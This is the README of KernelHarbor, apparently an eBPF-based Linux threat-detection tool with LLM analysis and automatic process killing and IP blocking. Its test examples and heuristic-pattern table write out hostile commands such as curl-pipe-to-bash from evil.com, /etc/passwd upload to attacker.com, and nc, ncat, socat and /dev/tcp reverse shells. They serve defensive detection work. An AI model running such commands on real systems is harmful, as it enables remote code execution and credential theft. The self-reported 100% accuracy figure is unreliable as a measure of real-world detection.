# KernelHarbor

Linux kernel security monitoring with eBPF and AI-powered analysis and automated response.

## Overview

KernelHarbor captures system events (execve, open, network) using eBPF and analyzes them with an AI pipeline for threat detection and response. When malicious behavior is detected, it can automatically kill processes or block network connections.

The demo below was done on the same device for simplicity. Analysis server ideally would run on a separate machine than the one running the agent.

https://github.com/user-attachments/assets/99ef4a91-b9aa-411d-b847-0af310006de9


[alternate demo link](https://youtu.be/noDXemJ9wUM)

## Components

### Tracers (`cmd/`)

| Component | Description |
|-----------|-------------|
| `agent/` | Unified eBPF tracer (execve + open + openat + connect) |
| `analysis/` | AI-powered event analysis pipeline (gRPC + HTTP) |

### eBPF Programs (`bpf/`)

| File | Description |
|------|-------------|
| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
| `open-tracer.bpf.c` | Hooks `sys_enter_open` |
| `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with directory path resolution via `bpf_d_path` |
| `connect-tracer.bpf.c` | Hooks `sys_enter_connect` |

## Quick Start

### Prerequisites

```bash
# Install eBPF toolchain (Debian/Ubuntu)
sudo apt install clang llvm libbpf-dev linux-tools-$(uname -r)

# Install eBPF toolchain (Fedora/RHEL)
sudo dnf install clang llvm libbpf-devel kernel-headers

# Start Elasticsearch
docker run -d --name elasticsearch -p 9200:9200 \
  -e "discovery.type=single-node" \
  -e "xpack.security.enabled=false" \
  docker.elastic.co/elasticsearch/elasticsearch:8.17.4

# Start Ollama
ollama serve
ollama pull nomic-embed-text
ollama pull qwen2.5:7b
```

### Build

```bash
# Build everything (tracers + agent + analysis)
# Generates vmlinux.h and runs bpf2go automatically.
make

# Or build individual components
make agent
make analysis
make execve-tracer
make open-tracer
make openat-tracer

# Remove binaries, generated bpf2go output, and vmlinux.h
make clean
```

> **Note:** `vmlinux.h` is generated from your running kernel's BTF data (via `bpftool`) and is gitignored. You only need to regenerate it when switching to a kernel with different data structures. Since the eBPF programs use CO-RE (Compile Once, Run Everywhere), the compiled programs are portable across kernel versions.

### Run

```bash
# Terminal 1: Start analysis service (provides HTTP and gRPC)
cd cmd/analysis && ./analysis

# Terminal 2: Start unified agent (requires sudo)
sudo GRPC_ADDRESS=localhost:9090 ./cmd/agent/agent

# Terminal 3: Query analysis via HTTP
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{"host.name":"myhost","query":"curl http://evil.com/script.sh | bash"}'
```

## Architecture

### Event Flow

1. **eBPF Tracers** hook kernel syscalls (`execve`, `open`, `connect`)
2. **Ring buffer** passes events to user-space Go program
3. **gRPC** sends events to analysis service
4. **Elasticsearch** stores events with vector embeddings
5. **Async workers** batch events and analyze with Ollama
6. **Vector search** finds semantically similar past events
7. **LLM** generates security verdict

### Response Flow

Automatic response actions are delivered to the agent through two mechanisms:

- **Immediate (heuristic)** — When the regex heuristic matches a known-bad pattern on ingest, an action (e.g., `KILL_PID`) is returned directly in the `IngestResponse` of the same RPC call. The agent executes it instantly — zero additional latency.

- **Delayed (AI)** — After the async AI analysis completes (1-3s), if the verdict is malicious, an action is stored in memory. The agent polls `FetchActions(hostname)` every 5 seconds and executes any pending actions.

| Trigger | Latency | Action Examples |
|---------|---------|----------------|
| Regex heuristic match | Same RPC response | `KILL_PID` |
| AI "malicious" verdict | ~5-8s (batch + poll) | `KILL_PID`, `BLOCK_IP` |

The agent runs as root and executes actions using OS primitives: `SIGKILL` for process termination and `iptables` for IP blocking.

### gRPC Service

The analysis service exposes a gRPC API on port 9090 (configurable):

| Method | Description |
|--------|-------------|
| `Ingest` | Send events to the analysis pipeline, returns heuristic actions |
| `Analyze` | Query AI analysis for a specific event |
| `FetchActions` | Poll for pending AI-derived actions (e.g., `KILL_PID`, `BLOCK_IP`) |

### Behavior Embedding

Events are converted to behavior summaries for vector search:

| Raw Command | Behavior Summary |
|-------------|-----------------|
| `curl x \| bash` | `execve remote_code_execution image:curl` |
| `wget y \| sh` | `execve remote_code_execution image:wget` |
| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i" \| base64 -d \| bash` | `execve encoded_command image:base64` |

This allows finding **semantically similar attacks**, not just keyword matches.

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/health` | GET | Health check |
| `/ingest` | POST | Ingest events |
| `/ingest/batch` | POST | Ingest batched events |
| `/analyze` | POST | Query AI analysis |
| `/actions/:hostname` | GET | Fetch pending actions for a host (used by agent polling) |

### Analyze Example

```bash
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "host.name": "myhost",
    "query": "curl -s http://evil.com/payload.sh | bash"
  }'
```

Response:
```json
{
  "verdict": "malicious",
  "confidence": 0.95,
  "summary": "curl is being used to pipe a remote script into bash, a common malware delivery pattern..."
}
```

## Environment Variables

### Analysis Service

| Variable | Default | Description |
|----------|---------|-------------|
| `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch addresses |
| `ES_INDEX` | `kb-events` | Events index |
| `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
| `OLLAMA_MODEL` | `qwen2.5:1.5b` | Analysis model |
| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
| `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
| `GRPC_ADDRESS` | `:9090` | gRPC server address |
| `HTTP_ADDRESS` | `:8080` | HTTP server address |

### Agent (Tracer)

| Variable | Description |
|----------|-------------|
| `GRPC_ADDRESS` | gRPC server address to send events (e.g., `localhost:9090`) |

## Testing

```bash
# Test benign
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"ls -la /home/user"}'

# Test suspicious
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"curl http://evil.com/payload.sh | bash"}'

# Test LOLBin
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"python3 -c \"import pty; pty.spawn('/bin/bash')\""}'
```

## Project Structure

```
KernelHarbor/
├── bpf/                # eBPF programs (C)
│   ├── execve-tracer.bpf.c
│   ├── open-tracer.bpf.c
│   ├── openat-tracer.bpf.c
│   ├── connect-tracer.bpf.c
│   ├── process.h       # Shared process_info struct
│   └── open.h          # O_* flag constants
├── cmd/
│   ├── agent/          # Unified tracer (execve + open + openat + connect)
│   │   ├── bench_test.go       # Synthetic benchmarks
│   │   └── bench_ebpf_test.go  # eBPF benchmarks (gated)
│   ├── execve-tracer/  # Standalone execve tracer
│   ├── open-tracer/    # Standalone open tracer
│   ├── openat-tracer/  # Standalone openat tracer
│   └── analysis/       # AI analysis pipeline (gRPC + HTTP)
│       ├── bench_test.go       # Analysis benchmarks + accuracy test
│       ├── bench_dataset_test.go # Labeled benchmark dataset
│       └── bench_report.go     # Markdown report formatter
├── proto/              # Protocol Buffer definitions
│   └── agent.proto
├── scripts/
│   └── bench.sh        # Benchmark runner
├── plan.md             # Original design document
└── README.md           # This file
```

## Benchmarks

### Running

```bash
# Run all benchmarks (synthetic only, no external services needed)
./scripts/bench.sh

# Run analysis benchmarks only
cd cmd/analysis && go test -bench=. -benchmem -count=3 ./...

# Run agent synthetic benchmarks only
cd cmd/agent && go test -bench=. -benchmem -count=3 ./...

# Run eBPF benchmarks (requires root + Linux kernel)
sudo sh -c 'cd cmd/agent && go test -tags=ebpf -bench=BenchmarkEbpf -benchmem ./...'

# Run with external services (Elasticsearch + Ollama)
ES_ADDRESSES=http://localhost:9200 OLLAMA_ADDRESS=http://localhost:11434 \
  go test -bench='Benchmark(ES|Ollama)' -benchmem ./...
```

### Detection Accuracy

Measured against a labeled dataset of 190 events (101 benign, 49 suspicious, 40 malicious):

| Metric | Value |
|--------|-------|
| Accuracy | 100.00% |
| Precision | 100.00% |
| Recall | 100.00% |
| F1 Score | 100.00% |
| False Positive Rate | 0.00% |

#### Heuristic Patterns

The detector uses 38 compiled regex patterns covering:

| Category | Patterns | Examples |
|----------|----------|----------|
| Curl exfil | pipe, redirect, `-d`, `-T`, `-k`, `-s http://`, `--post-data`, `--no-check-certificate`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
| Wget exfil | `-O`, `-A`, pipe, redirect, `--post-data`, `--no-check-certificate` | `wget --no-check-certificate https://evil.com/` |
| Shell exec | `bash -c`, `sh -c`, `/bin/bash -c`, `/bin/sh -c` | `bash -c 'cat /etc/shadow'` |
| Shell interactive | `bash -i`, `sh -i` | `bash -i >& /dev/tcp/...` |
| Netcat | `-l`, `-v`, `-e`, `-u`, `-z`, `-w`, `-p`, `nc <host> <port> -e` | `nc attacker.com 4444 -e /bin/bash` |
| Ncat | any `ncat` invocation | `ncat --ssl attacker.com 4444 -e /bin/sh` |
| Socat | any `socat` invocation | `socat TCP-LISTEN:4444 EXEC:/bin/sh` |
| Reverse shells | `/dev/tcp`, `/dev/udp` | `exec 5<>/dev/tcp/attacker.com/80` |
| Encoding | `base64 -d` | `echo YmFz... | base64 -d \| bash` |
| Scripting | `powershell`, `python.*socket/subprocess/pty/os.*`, `perl -e`, `ruby -e`, `php -r` | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Extensions | `.sh`, `.bash`, `.ps1` (with benign-context exclusion) | `/tmp/malware.sh` |

> Benign `.sh` references (e.g., `chmod 755 script.sh`) are excluded via `isBenignShRef()`.

### Heuristic Pattern Latency

Per-pattern `hasSuspiciousPattern()` latency (pre-compiled regex, 0 allocs):

| Pattern | ns/op | allocs |
|---------|-------|--------|
| `curl \| bash` (curl_pipe) | ~900 | 0 |
| `curl -s http://` (curl_silent_http) | ~3,000 | 0 |
| `curl -d @file` (curl_data_upload) | ~1,200 | 0 |
| `wget -O- \| sh` (wget_output) | ~970 | 0 |
| `wget --post-data` | ~6,400 | 0 |
| `bash -c 'cmd'` (bash_minus_c) | ~1,250 | 0 |
| `sh -c 'cmd'` (sh_minus_c) | ~1,100 | 0 |
| `bash -i` (bash_interactive) | ~4,100 | 0 |
| `nc -lvp` (nc_listen) | ~3,400 | 0 |
| `nc host port -e` (nc_exec_post) | ~5,100 | 0 |
| `ncat host port` (ncat_connect) | ~3,100 | 0 |
| `socat TCP-LISTEN` (socat_exec) | ~5,700 | 0 |
| `base64 -d` (base64_decode) | ~5,400 | 0 |
| `powershell` | ~9,300 | 0 |
| `python -c socket` (python_socket) | ~6,400 | 0 |
| `python -c pty` (python_pty) | ~10,400 | 0 |
| `perl -e` (perl_eval) | ~4,200 | 0 |
| `ruby -e` (ruby_eval) | ~4,400 | 0 |
| `php -r` (php_eval) | ~4,800 | 0 |
| `/dev/tcp` (dev_tcp) | ~1,650 | 0 |
| `/bin/bash -c` (shell_minus_c) | ~1,900 | 0 |
| benign (ls, curl, git, python, wget) | ~6,100–13,100 | 0 |

> Benign commands scan all patterns before returning false, hence higher latency. Pre-compiling regex patterns eliminated all per-call allocations (previously 34–519 allocs/op).

### Event Processing Throughput

| Benchmark | ns/op | B/op | allocs/op |
|-----------|-------|------|-----------|
| `ToBehaviorSummary()` | ~5,200 | 357 | 10 |
| `ToSearchText()` | ~815 | 359 | 10 |
| `hasSuspiciousPattern()` (avg) | ~4,600 | 0 | 0 |
| Event serialization | ~5,500 | 715 | 20 |

### gRPC Analysis Latency (in-process)

| Percentile | Latency |
|------------|---------|
| p50 | ~440µs |
| p95 | ~810µs |
| p99 | ~1.5ms |

### Agent Synthetic Benchmarks

| Benchmark | ns/op | B/op | allocs/op |
|-----------|-------|------|-----------|
| Execve event parsing | ~33,000 | 3,120 | 2 |
| Open event parsing | ~4,100 | 336 | 2 |
| Connect event parsing | ~1,300 | 120 | 3 |
| Event → protobuf | ~86 | 24 | 1 |
| Event → JSON | ~1,630 | 480 | 3 |
| Ring buffer channel send | ~23 | 0 | 0 |

### eBPF Benchmarks (real kernel, `//go:build ebpf`)

| Benchmark | Description |
|-----------|-------------|
| `BenchmarkEbpfCPUOverhead` | CPU overhead of attached eBPF programs |
| `BenchmarkEbpfEventDropRate` | Ring buffer event drop rate under load |
| `BenchmarkEbpfMemoryOverhead` | Memory overhead of 4 eBPF tracers |

> Requires `sudo` and `-tags=ebpf`. Not available in CI.

### External Service Benchmarks (gated by env vars)

| Benchmark | Env Var | Description |
|-----------|---------|-------------|
| `BenchmarkESIndexing` | `ES_ADDRESSES` | Elasticsearch bulk indexing throughput |
| `BenchmarkOllamaEmbedding` | `OLLAMA_ADDRESS` | Per-event embedding latency |
| `BenchmarkOllamaGeneration` | `OLLAMA_ADDRESS` | LLM analysis generation latency |
| `BenchmarkGRPCSendLatency` | `GRPC_ADDRESS` | Agent→server round-trip latency |

## CI/CD Limitations

GitHub Actions runners do **not** support eBPF. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## License

MIT
